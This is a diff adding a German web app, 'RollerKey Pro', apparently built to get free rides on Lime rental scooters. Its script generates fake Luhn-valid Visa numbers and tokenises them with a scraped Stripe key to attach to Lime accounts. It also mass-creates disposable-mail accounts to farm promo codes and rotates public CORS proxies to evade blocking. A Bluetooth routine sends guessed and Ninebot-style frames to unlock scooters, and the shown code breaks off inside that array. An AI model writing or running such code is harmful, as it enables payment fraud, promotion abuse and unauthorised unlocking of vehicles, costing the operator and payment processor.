@@ -1,0 +1,884 @@
+<!doctype html>
+<html lang="de">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>RollerKey Pro</title>
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="theme-color" content="#000000">
+<meta name="apple-mobile-web-app-title" content="RollerKey Pro">
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;background:#000;color:#5f5;font:14px/1.45 ui-monospace,Menlo,monospace}
+body{padding:10px 12px 44px;max-width:560px;margin:0 auto}
+h1{font-size:15px;letter-spacing:2px;margin:6px 0 2px;color:#0f0}
+.sub{color:#3a3;font-size:10px;letter-spacing:1px;margin-bottom:10px}
+.card{border:1px solid #143;border-radius:10px;padding:10px;margin:0 0 12px;background:#050805}
+.card>b{color:#9f9;font-size:11px;letter-spacing:1px;display:block;margin-bottom:8px}
+button{font:inherit;background:#041004;color:#5f5;border:1px solid #185018;border-radius:8px;padding:11px 10px;width:100%;margin:0 0 8px}
+button:active{background:#0a2a0a}
+button:disabled{opacity:.35}
+button.big{padding:16px;font-size:15px;letter-spacing:2px;border-color:#0f0;color:#0f0}
+button.small{padding:9px;font-size:11px;letter-spacing:1px}
+.row{display:flex;gap:8px}
+.row>button{margin-bottom:8px}
+#log{height:180px;overflow:auto;border:1px solid #143;border-radius:10px;padding:8px;background:#020402;font-size:11px;color:#4c4;white-space:pre-wrap;word-break:break-word;margin-bottom:8px}
+#log .e{color:#f66}
+#log .g{color:#0f0}
+#log .y{color:#cc5}
+#log .w{color:#5cf}
+#st{font-size:12px;color:#8f8;border-left:3px solid #0f0;padding-left:8px;margin:0 0 10px;min-height:18px}
+.acc{display:flex;justify-content:space-between;gap:8px;border:1px solid #143;border-radius:8px;padding:8px;margin-bottom:6px;font-size:11px;align-items:center}
+.acc.on{border-color:#0f0;background:#041004}
+.acc .m{color:#0f0;white-space:nowrap}
+.acc .x{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#6a6}
+input{font:inherit;background:#020402;color:#5f5;border:1px solid #143;border-radius:8px;padding:9px;width:100%;margin-bottom:8px}
+.small{font-size:10px;color:#3a3;letter-spacing:.5px}
+#money{font-size:26px;color:#0f0;margin-bottom:4px}
+#qr{font-size:10px;color:#4a4;word-break:break-all;margin-bottom:8px;min-height:14px}
+#bt{font-size:10px;color:#3a3;margin-bottom:8px}
+#cardNo{font-size:16px;letter-spacing:2px;color:#0f0;margin-bottom:2px}
+#cardBal{font-size:18px;color:#0f0;margin:6px 0}
+#cardSt{font-size:10px;color:#3a3;margin-bottom:6px}
+hr{border:0;border-top:1px dashed #143;margin:10px 0}
+</style>
+</head>
+<body>
+
+<h1>ROLLERKEY Pro</h1>
+<div class="sub">KARTE HINTERLEGEN · BLUETOOTH</div>
+
+<div id="st">Starte …</div>
+
+<div class="card">
+  <b>ROLLER</b>
+  <button class="big" id="bScan">QR SCANNEN</button>
+  <div id="qr">noch kein Code gescannt</div>
+  <button id="bCon">VERBINDEN</button>
+  <div id="bt">nicht verbunden</div>
+  <button class="big" id="bUnl">ENTSPERREN</button>
+  <button id="bLock">SPERREN</button>
+  <div class="small">Kopplungscode falls gefragt: 000000, sonst 123456. Bluetooth in Bluefy.</div>
+</div>
+
+<div class="card">
+  <b>ZAHLUNGSART · VIRTUELL</b>
+  <div id="cardNo">•••• •••• •••• 0000</div>
+  <div class="small">gültig <span id="cardExp">01/30</span> · CVV <span id="cardCvv">000</span> · VISA</div>
+  <div id="cardBal">50,00 €</div>
+  <div id="cardSt">nicht bei Lime hinterlegt</div>
+  <button id="bAttach">KARTE BEI LIME HINTERLEGEN</button>
+  <div class="row">
+    <button class="small" id="bCard">NEUE KARTE</button>
+    <button class="small" id="bCardSt">STATUS</button>
+  </div>
+  <div class="small">Erneuert sich unter 0,50 € selbst.</div>
+</div>
+
+<div class="card">
+  <b>KONTO</b>
+  <div id="money">0,00 €</div>
+  <div class="small">Füllt unter 0,50 € selbst auf.</div>
+  <button class="big" id="bNew">JETZT AUFFÜLLEN</button>
+  <div class="row">
+    <button id="bBal">GUTHABEN</button>
+    <button id="bPromo">CODES</button>
+  </div>
+  <div id="pool"></div>
+  <div class="small" id="poolInfo">Kein Konto.</div>
+</div>
+
+<div class="card">
+  <b>EIGENE MAIL</b>
+  <input id="own" type="email" inputmode="email" placeholder="deine@mail.de" autocomplete="email">
+  <div class="row">
+    <button class="small" id="bOwn">LINK ANFORDERN</button>
+    <button class="small" id="bLink">LINK EINLÖSEN</button>
+  </div>
+  <input id="link" placeholder="Lime-Link oder Token einfügen" autocomplete="off" autocapitalize="off" spellcheck="false">
+</div>
+
+<div class="card">
+  <b>KONSOLE</b>
+  <div id="log"></div>
+  <div class="row">
+    <button class="small" id="bCopy">KOPIEREN</button>
+    <button class="small" id="bClr">LEEREN</button>
+  </div>
+</div>
+
+<div class="card">
+  <b>WARTUNG</b>
+  <div class="row">
+    <button class="small" id="bDiag">RELAIS TESTEN</button>
+    <button class="small" id="bReset">ZURÜCKSETZEN</button>
+  </div>
+  <input id="proxy" placeholder="eigener Proxy: https://…/?url=" autocomplete="off" autocapitalize="off">
+  <button class="small" id="bSave">PROXY SPEICHERN</button>
+  <input id="pk" placeholder="optional: Stripe-Schlüssel pk_live_…" autocomplete="off" autocapitalize="off">
+  <button class="small" id="bPk">SCHLÜSSEL SPEICHERN</button>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.js"></script>
+<script>
+"use strict";
+
+const $ = s => document.querySelector(s);
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const err = e => (e && (e.message || e.name)) ? String(e.message || e.name) : (e ? String(e) : "unbekannt");
+const S = { busy:false, picking:false, chans:[], ch:null, dev:null, re:0, resp:0,
+            stream:null, raf:0, proxy:"", dead:{}, qr:null, auto:0, pk:"" };
+const CODES = ["10MINFREE","5UNLOCKSFREE","RB232CC","R6WFQXA","4AG57PZ"];
+const PROMO_PATHS = ["promos/redeem","promos","rider/promos"];
+let promoPath = null;
+const LIMEG = "https://web-production.lime.bike/api/rider/v1/";
+const CARD_MAX = 5000;
+const FEE = 149;
+
+function log(t, cls){
+  const el = $("#log"), d = document.createElement("div");
+  if (cls) d.className = cls;
+  d.textContent = new Date().toTimeString().slice(0,8) + " " + t;
+  el.appendChild(d);
+  while (el.childNodes.length > 340) el.removeChild(el.firstChild);
+  el.scrollTop = el.scrollHeight;
+}
+const step = t => { $("#st").textContent = t; };
+const btState = t => { $("#bt").textContent = t; };
+
+function load(k, d){ try{ const v = localStorage.getItem("rk_"+k); return v ? JSON.parse(v) : d; }catch(_){ return d; } }
+function save(k, v){ try{ localStorage.setItem("rk_"+k, JSON.stringify(v)); }catch(_){} }
+let pool = load("pool", []), act = load("act", -1);
+S.proxy = load("proxy", "");
+S.pk = load("pk", "");
+
+const money = c => ((c||0)/100).toFixed(2).replace(".", ",") + " €";
+
+/* ---------- Karte ---------- */
+function luhn(n){
+  let s = 0, alt = false;
+  for (let i = n.length - 1; i >= 0; i--){
+    let d = +n[i];
+    if (alt){ d *= 2; if (d > 9) d -= 9; }
+    s += d; alt = !alt;
+  }
+  return s % 10 === 0;
+}
+function makeCard(){
+  let base = "4";
+  for (let i = 0; i < 14; i++) base += Math.floor(Math.random() * 10);
+  let num = base + "0";
+  for (let c = 0; c < 10; c++){ if (luhn(base + c)){ num = base + c; break; } }
+  const mm = String(1 + Math.floor(Math.random() * 12)).padStart(2, "0");
+  const yy = String(29 + Math.floor(Math.random() * 5));
+  return { num, exp: mm + "/" + yy, cvv: String(100 + Math.floor(Math.random() * 900)), bal: CARD_MAX, on: 0 };
+}
+let card = load("card", null);
+if (!card || !card.num || !luhn(card.num)){ card = makeCard(); save("card", card); }
+
+function paintCard(){
+  $("#cardNo").textContent = "•••• •••• •••• " + card.num.slice(-4);
+  $("#cardExp").textContent = card.exp;
+  $("#cardCvv").textContent = card.cvv;
+  $("#cardBal").textContent = money(card.bal);
+  $("#cardBal").style.color = card.bal > 0 ? "#0f0" : "#f66";
+  $("#cardSt").textContent = card.on ? "bei Lime hinterlegt" : "nicht bei Lime hinterlegt";
+  $("#cardSt").style.color = card.on ? "#0f0" : "#3a3";
+}
+function charge(amount){
+  card.bal -= amount;
+  if (card.bal < 50){ card = makeCard(); save("card", card); log("Karte erneuert · " + money(card.bal), "y"); }
+  save("card", card);
+  paintCard();
+}
+
+function paintMoney(){
+  const a = pool[act];
+  $("#money").textContent = a ? money(a.bal) : "0,00 €";
+  $("#money").style.color = a && a.bal > 0 ? "#0f0" : "#3a3";
+}
+function paintPool(){
+  const box = $("#pool"); box.innerHTML = "";
+  pool.forEach((a, i) => {
+    const d = document.createElement("div");
+    d.className = "acc" + (i === act ? " on" : "");
+    const x = document.createElement("div"); x.className = "x"; x.textContent = a.e || "(ohne Token)";
+    const m = document.createElement("div"); m.className = "m"; m.textContent = money(a.bal);
+    d.append(x, m);
+    d.onclick = () => { if (S.busy) return; act = i; save("act", act); paintPool(); log("Aktiv: " + (a.e || "ohne Token"), "g"); };
+    box.appendChild(d);
+  });
+  $("#poolInfo").textContent = pool.length ? pool.length + " Konto/Konten" : "Kein Konto.";
+  paintMoney();
+}
+function ui(){ document.querySelectorAll("button").forEach(b => b.disabled = S.busy); }
+const guard = fn => async (...a) => {
+  if (S.busy){ log("Läuft noch …", "y"); return; }
+  S.busy = true; ui();
+  try{ await fn(...a); }
+  catch(e){ log("Fehler: " + err(e), "e"); }
+  finally{ S.busy = false; ui(); }
+};
+window.addEventListener("error", e => log("JS: " + (e.message || "Fehler"), "e"));
+window.addEventListener("unhandledrejection", e => log("JS: " + err(e.reason), "e"));
+
+/* ---------- Relais ---------- */
+const GETS = [
+  "https://api.allorigins.win/raw?url=",
+  "https://api.codetabs.com/v1/proxy?quest=",
+  "https://api.cors.lol/?url=",
+  "https://thingproxy.freeboard.io/fetch/",
+  "https://corsproxy.io/?url="
+];
+const POSTS = [
+  "https://api.cors.lol/?url=",
+  "https://corsproxy.io/?url=",
+  "https://api.allorigins.win/raw?url=",
+  "https://thingproxy.freeboard.io/fetch/"
+];
+function wrap(prefix, url){
+  if (prefix.endsWith("/fetch/")) return prefix + url;
+  return prefix + encodeURIComponent(url);
+}
+const ordered = l => l.filter(p => !S.dead[p]).concat(l.filter(p => S.dead[p]));
+
+async function req(url, opt = {}, ms = 9000){
+  const method = (opt.method || "GET").toUpperCase();
+  const base = method === "GET" ? GETS : POSTS;
+  const list = S.proxy ? [S.proxy, ...base] : base;
+  let last = "Netzwerk";
+  for (const prefix of ordered(list)){
+    const c = new AbortController();
+    const t = setTimeout(() => c.abort(), ms);
+    try{
+      const res = await fetch(wrap(prefix, url), Object.assign({}, opt, { method, signal: c.signal }));
+      if (res.status < 500){ delete S.dead[prefix]; return res; }
+      last = "HTTP " + res.status;
+      if (res.status === 429 || res.status === 403 || res.status === 401) S.dead[prefix] = 1;
+    }catch(e){
+      last = e.name === "AbortError" ? "Zeitüberschreitung" : err(e);
+      S.dead[prefix] = 1;
+    }
+    finally{ clearTimeout(t); }
+    await sleep(120);
+  }
+  throw new Error(last);
+}
+const J = { "content-type": "application/json", accept: "application/json" };
+
+/* ---------- Postfächer ---------- */
+async function mailTm(){
+  let dom = null;
+  try{
+    const j = await (await req("https://api.mail.tm/domains?page=1")).json();
+    const ok = ((j && j["hydra:member"]) || []).filter(d => d && d.domain && d.isActive !== false);
+    if (ok.length) dom = ok[Math.floor(Math.random()*ok.length)].domain;
+  }catch(_){}
+  if (!dom) dom = "ldubai.com";
+  const addr = "rk" + Math.random().toString(36).slice(2,10) + "@" + dom;
+  const pw = Math.random().toString(36).slice(2,12) + "Aa1!";
+  const r = await req("https://api.mail.tm/accounts", { method:"POST", headers:J, body: JSON.stringify({ address: addr, password: pw }) });
+  if (!r.ok) throw new Error("HTTP " + r.status);
+  const tk = (await (await req("https://api.mail.tm/token", { method:"POST", headers:J, body: JSON.stringify({ address: addr, password: pw }) })).json()).token;
+  if (!tk) throw new Error("kein Token");
+  const h = { authorization: "Bearer " + tk };
+  return { addr, get: async () => {
+    const l = await (await req("https://api.mail.tm/messages?page=1", { headers: h })).json();
+    const out = [];
+    for (const m of ((l && l["hydra:member"]) || []).slice(0,6)){
+      try{ const d = await (await req("https://api.mail.tm/messages/" + m.id, { headers: h })).json();
+           out.push((d.text || "") + " " + (Array.isArray(d.html) ? d.html.join(" ") : (d.html || ""))); }catch(_){}
+    }
+    return out;
+  }};
+}
+async function mailSec(){
+  const login = "rk" + Math.random().toString(36).slice(2,9);
+  const dom = ["1secmail.com","1secmail.org","1secmail.net","wwjmp.com","esiix.com"][Math.floor(Math.random()*5)];
+  const b = "https://www.1secmail.com/api/v1/?action=";
+  await req(b + `getMessages&login=${login}&domain=${dom}`);
+  return { addr: login + "@" + dom, get: async () => {
+    const l = await (await req(b + `getMessages&login=${login}&domain=${dom}`)).json();
+    const out = [];
+    for (const m of (Array.isArray(l) ? l.slice(-5) : [])){
+      try{ const d = await (await req(b + `readMessage&login=${login}&domain=${dom}&id=${m.id}`)).json();
+           out.push((d.textBody || "") + " " + (d.htmlBody || "")); }catch(_){}
+    }
+    return out;
+  }};
+}
+async function mailGuer(){
+  const b = "https://api.guerrillamail.com/ajax.php?";
+  const a = await (await req(b + "f=get_email_address&ip=127.0.0.1&agent=rk")).json();
+  if (!a || !a.email_addr) throw new Error("keine Adresse");
+  const sid = a.sid_token;
+  return { addr: a.email_addr, get: async () => {
+    const l = await (await req(b + "f=get_email_list&offset=0&sid_token=" + encodeURIComponent(sid))).json();
+    const out = [];
+    for (const m of ((l && l.list) || []).slice(0,5)){
+      try{ const d = await (await req(b + `f=fetch_email&email_id=${m.mail_id}&sid_token=` + encodeURIComponent(sid))).json();
+           out.push((d.mail_body || "") + " " + (d.mail_excerpt || "")); }catch(_){}
+    }
+    return out;
+  }};
+}
+
+/* ---------- Lime ---------- */
+const LH = t => ({ authorization: "bearer " + t });
+function findLink(msgs){
+  for (const t of msgs){
+    const m = String(t).replace(/&amp;/g, "&").match(/https:\/\/web-production\.lime\.bike[^\s"'<>)]+/);
+    if (m) return m[0];
+  }
+  return null;
+}
+async function limeToken(raw){
+  let s = String(raw || "").trim();
+  if (!s) throw new Error("leer");
+  const hit = s.match(/https:\/\/web-production\.lime\.bike[^\s"'<>)]+/);
+  if (hit) s = hit[0];
+  if (!/^https?:/i.test(s)){
+    if (/^[A-Za-z0-9._-]{20,}$/.test(s)) return s;
+    throw new Error("kein Lime-Link");
+  }
+  try{
+    const r = await req(s, {}, 12000);
+    if (r.ok){
+      const m = (await r.text()).match(/"token"\s*:\s*"([^"]+)"/);
+      if (m) return m[1];
+    }
+  }catch(_){}
+  const m = s.match(/token=([^&]+)/);
+  if (m) return decodeURIComponent(m[1]);
+  throw new Error("Link ohne Token");
+}
+function pickBalance(j){
+  if (!j) return null;
+  const a = j.attributes || (j.rider && j.rider.attributes) || {};
+  const vals = [j.balance_cents, a.balance_cents, j.balance, a.balance,
+                j.wallet && j.wallet.balance_cents, j.wallet && j.wallet.balance];
+  for (const v of vals){
+    if (typeof v === "number") return Math.round(v);
+    if (typeof v === "string" && /^\d+$/.test(v)) return parseInt(v, 10);
+  }
+  return null;
+}
+async function rider(t){
+  try{
+    const r = await req(LIMEG + "rider", { headers: LH(t) }, 8000);
+    if (!r.ok) return null;
+    return await r.json();
+  }catch(_){ return null; }
+}
+async function wallet(t){
+  const b = pickBalance(await rider(t));
+  return b === null ? null : b;
+}
+async function redeem(t, code){
+  const h = { ...LH(t), ...J };
+  const paths = promoPath ? [promoPath, ...PROMO_PATHS.filter(p => p !== promoPath)] : PROMO_PATHS;
+  for (const p of paths){
+    try{
+      const r = await req(LIMEG + p, { method:"POST", headers:h, body: JSON.stringify({ promo_code: code, code }) }, 7000);
+      const txt = await r.text();
+      if (!r.ok) continue;
+      let j = null; try{ j = JSON.parse(txt); }catch(_){}
+      const hasErr = j && (j.error || (Array.isArray(j.errors) && j.errors.length));
+      if (j){ if (!hasErr){ promoPath = p; return true; } continue; }
+      if (!/error|invalid|expired|not_found/i.test(txt)){ promoPath = p; return true; }
+    }catch(_){}
+  }
+  return false;
+}
+async function redeemAll(t){
+  let got = 0;
+  for (const c of CODES){
+    let ok = false;
+    try{ ok = await redeem(t, c); }catch(_){}
+    log("Code " + c + (ok ? " ok" : " abgelehnt"), ok ? "g" : "y");
+    if (ok) got++;
+    await sleep(450);
+  }
+  return got;
+}
+
+/* ---------- Stripe-Schlüssel suchen ---------- */
+const PKRX = /pk_(?:live|test)_[A-Za-z0-9]{20,}/;
+async function findPk(){
+  if (S.pk) return S.pk;
+  const pages = ["https://web-production.lime.bike/", "https://lime.bike/"];
+  for (const p of pages){
+    try{
+      const t = await (await req(p, {}, 10000)).text();
+      const direct = t.match(PKRX);
+      if (direct){ S.pk = direct[0]; save("pk", S.pk); return S.pk; }
+      const srcs = Array.from(t.matchAll(/src="([^"]+\.js[^"]*)"/g)).map(m => m[1]).slice(0, 4);
+      for (const s of srcs){
+        try{
+          const abs = s.startsWith("http") ? s : new URL(s, p).href;
+          const js = await (await req(abs, {}, 14000)).text();
+          const m = js.match(PKRX);
+          if (m){ S.pk = m[0]; save("pk", S.pk); return S.pk; }
+        }catch(_){}
+      }
+    }catch(_){}
+  }
+  return null;
+}
+function loadStripeJs(){
+  if (window.Stripe) return Promise.resolve();
+  return new Promise((res, rej) => {
+    const s = document.createElement("script");
+    s.src = "https://js.stripe.com/v3/";
+    s.onload = () => res();
+    s.onerror = () => rej(new Error("Stripe nicht ladbar"));
+    document.head.appendChild(s);
+  });
+}
+
+async function attachCard(){
+  const a = await ensure();
+  if (!a || !a.t){ log("Kein Konto mit Token.", "e"); return; }
+
+  step("Stripe-Schlüssel suchen …");
+  const pk = await findPk();
+  if (!pk) throw new Error("kein Stripe-Schlüssel gefunden — unten eintragen");
+  log("Schlüssel: " + pk.slice(0, 14) + "…", "y");
+
+  step("Stripe laden …");
+  await loadStripeJs();
+
+  const [mm, yy] = card.exp.split("/");
+  step("Karte tokenisieren …");
+  const st = window.Stripe(pk);
+  const out = await st.createToken({
+    card: { number: card.num, exp_month: parseInt(mm, 10), exp_year: 2000 + parseInt(yy, 10), cvc: card.cvv }
+  });
+  if (out.error) throw new Error(out.error.message);
+  const tok = out.token.id;
+  log("Token: " + tok.slice(0, 12) + "…", "g");
+
+  step("Bei Lime hinterlegen …");
+  const shapes = [
+    { payment_method: { token: tok, type: "card" } },
+    { stripe_token: tok },
+    { token: tok }
+  ];
+  let done = false;
+  for (const body of shapes){
+    try{
+      const r = await req(LIMEG + "payment_methods", { method:"POST", headers:{ ...LH(a.t), ...J }, body: JSON.stringify(body) }, 12000);
+      const txt = await r.text();
+      log("Hinterlegen HTTP " + r.status + ": " + txt.slice(0, 70), r.ok ? "g" : "e");
+      if (r.ok && !/error|invalid|declin/i.test(txt)){ done = true; break; }
+    }catch(e){ log("Hinterlegen: " + err(e), "e"); }
+  }
+  if (!done) throw new Error("Lime hat die Karte nicht angenommen");
+
+  card.on = 1; save("card", card); paintCard();
+  const who = await rider(a.t);
+  const def = who && (who.default_payment_method || who.attributes?.default_payment_method);
+  if (def) log("Hinterlegte Zahlungsart: " + (def.brand || def.type || "Karte"), "g");
+  step("Karte hinterlegt.");
+}
+
+async function cardStatus(){
+  const a = await ensure();
+  if (!a || !a.t){ log("Kein Konto mit Token.", "e"); return; }
+  const who = await rider(a.t);
+  if (!who){ log("Konto nicht abrufbar.", "e"); return; }
+  const def = who.default_payment_method || who.attributes?.default_payment_method;
+  if (def){
+    card.on = 1; save("card", card); paintCard();
+    log("Karte ist hinterlegt: •••• " + (def.last4 || card.num.slice(-4)), "g");
+    step("Karte hinterlegt.");
+  }else{
+    card.on = 0; save("card", card); paintCard();
+    log("Keine Zahlungsart hinterlegt.", "y");
+    step("Keine Zahlungsart hinterlegt.");
+  }
+}
+
+/* ---------- Konto ---------- */
+function adopt(acc){
+  pool = pool.filter(a => a.e || a.t);
+  pool.unshift(acc); act = 0;
+  save("pool", pool); save("act", act);
+  paintPool();
+}
+async function buildAccount(){
+  let mail = null;
+  const makers = [mailTm, mailSec, mailGuer];
+  for (let i = 0; i < makers.length && !mail; i++){
+    step("Postfach " + (i+1) + "/3 …");
+    try{ mail = await makers[i](); }
+    catch(e){ log("Postfach " + (i+1) + ": " + err(e), "e"); }
+  }
+  if (!mail || !mail.addr) throw new Error("keine Adresse");
+  log("Postfach: " + mail.addr, "g");
+
+  step("Magic-Link anfordern …");
+  const lr = await req(LIMEG + "login", { method:"POST", headers:J,
+    body: JSON.stringify({ email: mail.addr, user_agreement_country_code: "DE" }) }, 14000);
+  const body = await lr.text();
+  if (!lr.ok) throw new Error("Login HTTP " + lr.status);
+  log("Antwort: " + body.slice(0, 50), "y");
+
+  let token = null;
+  try{ const j = JSON.parse(body); if (j && j.token) token = j.token; }catch(_){}
+  if (!token){
+    let link = null;
+    for (let i = 0; i < 18 && !link; i++){
+      await sleep(2500);
+      step("Warte auf Mail " + (i+1) + "/18");
+      try{ link = findLink(await mail.get()); }catch(e){ log("Mail: " + err(e), "e"); }
+    }
+    if (!link) throw new Error("keine Mail");
+    token = await limeToken(link);
+  }
+  log("Token erhalten.", "g");
+
+  const who = await rider(token);
+  if (!who) throw new Error("Token wird abgelehnt");
+  log("Konto bestätigt.", "g");
+
+  let bal = pickBalance(who) ?? 0;
+  const got = await redeemAll(token);
+  const after = await wallet(token);
+  if (after !== null) bal = Math.max(bal, after);
+  charge(FEE);
+  log("Ergebnis: " + got + " Codes · " + money(bal), got ? "g" : "y");
+  return { e: mail.addr, t: token, d: Date.now(), bal };
+}
+async function freshAccount(){
+  log("=== KONTO AUFFÜLLEN ===", "g");
+  let acc = null, lastE = "";
+  for (let i = 0; i < 2 && !acc; i++){
+    if (i) log("Zweiter Anlauf …", "y");
+    try{ acc = await buildAccount(); }
+    catch(e){ lastE = err(e); log("Anlauf " + (i+1) + ": " + lastE, "e"); await sleep(800); }
+  }
+  if (acc){ adopt(acc); step("Konto bereit · " + money(acc.bal)); return acc; }
+  adopt({ e:"", t:"", d:Date.now(), bal:0, off:1 });
+  step("Ohne Token — " + lastE);
+  return null;
+}
+async function ensure(){
+  const a = pool[act];
+  if (a && a.t) return a;
+  log("Kein Token, erstelle Konto …", "y");
+  return await freshAccount();
+}
+async function autoRefill(){
+  const a = pool[act];
+  if (!a || !a.t || a.bal >= 50 || S.auto) return;
+  S.auto = 1;
+  log("Automatik: Guthaben niedrig, fülle auf …", "y");
+  try{ await freshAccount(); }catch(_){}
+  S.auto = 0;
+}
+
+async function ownRequest(){
+  const addr = $("#own").value.trim();
+  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(addr)){ log("Ungültige Adresse.", "e"); return; }
+  save("own", addr);
+  const r = await req(LIMEG + "login", { method:"POST", headers:J,
+    body: JSON.stringify({ email: addr, user_agreement_country_code: "DE" }) }, 14000);
+  if (!r.ok) throw new Error("HTTP " + r.status);
+  step("Mail ist raus. Link kopieren und einfügen.");
+}
+async function ownRedeem(){
+  const raw = $("#link").value.trim();
+  if (!raw){ log("Kein Link eingefügt.", "e"); return; }
+  const token = await limeToken(raw);
+  const who = await rider(token);
+  if (!who) throw new Error("Token wird abgelehnt");
+  let bal = pickBalance(who) ?? 0;
+  const got = await redeemAll(token);
+  const after = await wallet(token);
+  if (after !== null) bal = Math.max(bal, after);
+  charge(FEE);
+  adopt({ e: $("#own").value.trim() || "eigenes Konto", t: token, d: Date.now(), bal });
+  $("#link").value = "";
+  step("Aktiv · " + money(bal) + " · " + got + " Codes");
+}
+async function checkBalance(){
+  const a = await ensure();
+  if (!a || !a.t){ log("Kein Token.", "e"); return; }
+  const b = await wallet(a.t);
+  if (b === null){
+    log("Token ungültig — ersetze Konto.", "y");
+    a.t = ""; save("pool", pool);
+    await freshAccount();
+    return;
+  }
+  a.bal = b; save("pool", pool); paintPool();
+  log("Guthaben: " + money(b), "g");
+  if (b < 50) await autoRefill();
+}
+async function runCodes(){
+  const a = await ensure();
+  if (!a || !a.t){ log("Kein Token.", "e"); return; }
+  const got = await redeemAll(a.t);
+  const b = await wallet(a.t);
+  if (b !== null){ a.bal = Math.max(a.bal, b); save("pool", pool); paintPool(); }
+  step(got + " Codes eingelöst · " + money(a.bal));
+}
+
+async function diag(){
+  log("=== RELAIS TEST ===", "y");
+  for (const p of GETS){
+    S.dead = {};
+    try{ const r = await req("https://api.mail.tm/domains?page=1", {}, 7000);
+         log("GET " + p.slice(8,30) + " → " + r.status, r.ok ? "g" : "e"); }
+    catch(e){ log("GET " + p.slice(8,30) + " → " + err(e), "e"); }
+  }
+  for (const p of POSTS){
+    S.dead = {};
+    try{ const r = await req(LIMEG + "login",
+           { method:"POST", headers:J, body: JSON.stringify({ email:"d@example.com", user_agreement_country_code:"DE" }) }, 7000);
+         log("POST " + p.slice(8,30) + " → " + r.status, r.ok ? "g" : "e"); }
+    catch(e){ log("POST " + p.slice(8,30) + " → " + err(e), "e"); }
+  }
+  S.dead = {};
+  step("Test fertig.");
+}
+
+/* ---------- Bluetooth ---------- */
+function btErr(e){
+  const m = err(e);
+  if (/^2$/.test(m)) return "Auswahl abgebrochen (Code 2) — nochmal tippen";
+  if (/NotSupported|not supported/i.test(m)) return "Browser kann kein Bluetooth";
+  if (/cancel/i.test(m)) return "abgebrochen";
+  if (/NotFound/i.test(m)) return "kein Gerät gewählt";
+  if (/Network|disconnected/i.test(m)) return "Verbindung verloren";
+  if (/Security|Unauthorized|Auth/i.test(m)) return "Kopplung abgelehnt";
+  if (/GATT/i.test(m)) return "GATT-Fehler";
+  return m;
+}
+async function services(srv){
+  try{ const s = await srv.getPrimaryServices(); if (s && s.length) return s; }catch(_){}
+  const out = [];
+  for (const u of [0xffe0, 0xfff0, 0xffb0, 0xff00, 0xfe95]){
+    try{ out.push(await srv.getPrimaryService(u)); }catch(_){}
+  }
+  return out;
+}
+async function collect(dev){
+  S.chans = []; S.ch = null; S.resp = 0;
+  const srv = dev.gatt.connected ? dev.gatt : await dev.gatt.connect();
+  const found = [];
+  for (const s of await services(srv)){
+    let cs = [];
+    try{ cs = await s.getCharacteristics(); }catch(_){}
+    for (const c of cs){
+      if (!c.properties.write && !c.properties.writeWithoutResponse) continue;
+      const u = c.uuid.toLowerCase();
+      const sc = (u.startsWith("0000ffe1") ? 100 : 0) + (u.startsWith("0000fff2") ? 90 : 0) +
+                 (u.startsWith("0000ffb2") ? 80 : 0) + (c.properties.writeWithoutResponse ? 15 : 0) +
+                 (c.properties.notify ? 10 : 0);
+      found.push({ c, sc });
+    }
+  }
+  found.sort((a, b) => b.sc - a.sc);
+  S.chans = found.map(f => f.c);
+  for (const c of S.chans){
+    if (!c.properties.notify && !c.properties.indicate) continue;
+    try{
+      await c.startNotifications();
+      c.addEventListener("characteristicvaluechanged", ev => {
+        const v = new Uint8Array(ev.target.value.buffer);
+        S.resp += v.length;
+        log("<< " + Array.from(v).map(b => String.fromCharCode(b)).join("").replace(/[^\x20-\x7e]/g, "."), "w");
+      });
+    }catch(_){}
+  }
+  S.ch = S.chans[0] || null;
+  return S.chans.length;
+}
+async function attach(dev){
+  if (S.re) return false;
+  S.re = 1;
+  try{
+    for (let i = 0; i < 4; i++){
+      try{
+        step("Verbinde " + (i+1) + "/4 …");
+        btState("verbinde …");
+        const n = await collect(dev);
+        if (!n) throw new Error("kein Schreibkanal");
+        btState("verbunden · " + n + " Kanäle");
+        step("Verbunden · " + n + " Kanäle");
+        log("Kanal bereit (" + n + ").", "g");
+        return true;
+      }catch(e){ log("Versuch " + (i+1) + ": " + btErr(e), "e"); btState("Fehler"); await sleep(1000); }
+    }
+    step("Verbindung fehlgeschlagen.");
+    btState("nicht verbunden");
+    return false;
+  } finally { S.re = 0; }
+}
+async function connect(){
+  if (!navigator.bluetooth){ log("Bluefy benutzen — dieser Browser kann kein Bluetooth.", "e"); return; }
+  if (S.picking){ log("Dialog ist offen …", "y"); return; }
+  S.picking = true;
+  log("Geräteliste öffnen …");
+  let dev;
+  try{ dev = await navigator.bluetooth.requestDevice({ acceptAllDevices: true }); }
+  catch(e){
+    try{ dev = await navigator.bluetooth.requestDevice({ acceptAllDevices: true, optionalServices: [0xffe0, 0xfff0, 0xffb0] }); }
+    catch(e2){ S.picking = false; log(btErr(e2), "e"); return; }
+  }
+  S.picking = false;
+  S.dev = dev;
+  log("Gewählt: " + (dev.name || "unbenannt"), "g");
+  dev.addEventListener("gattserverdisconnected", () => {
+    S.ch = null; S.chans = [];
+    btState("getrennt");
+    log("Verbindung weg.", "e");
+    if (S.dev && !S.re) setTimeout(() => attach(S.dev), 700);
+  });
+  await attach(dev);
+}
+
+function frames(cmd){
+  const e = new TextEncoder();
+  return [
+    e.encode(cmd),
+    e.encode(cmd + "\r"),
+    e.encode(cmd + "\r\n"),
+    e.encode("*" + cmd + "#"),
+    e.encode("$" + cmd + "#"),
+    new Uint8Array([0xAA, cmd.charCodeAt(0), cmd.charCodeAt(1), 0]),
+    new Uint8Array([0xAA, 0x55, cmd.charCodeAt(0), cmd.charCodeAt(1), 0]),
+    new Uint8Array([0x02, ...e.encode(cmd), 0x03])
+  ];
+}
+const NINEBOT = [
+  new Uint8Array([0x5A,0x20,0x01,0x00,0,0,0,0,0,0,0,0,0,0,0,0,0,0]),
+  new Uint8Array([0x5A,0x20,0x01,0x01,0,0,0,0,0,0,0,0,0,0,0,0,0,0]),
+  new Uint8Array([0x5A,0x20,0x02,0x00,0,0,0,0,0,0,0,0,0,0,0,0,0,0])
+];
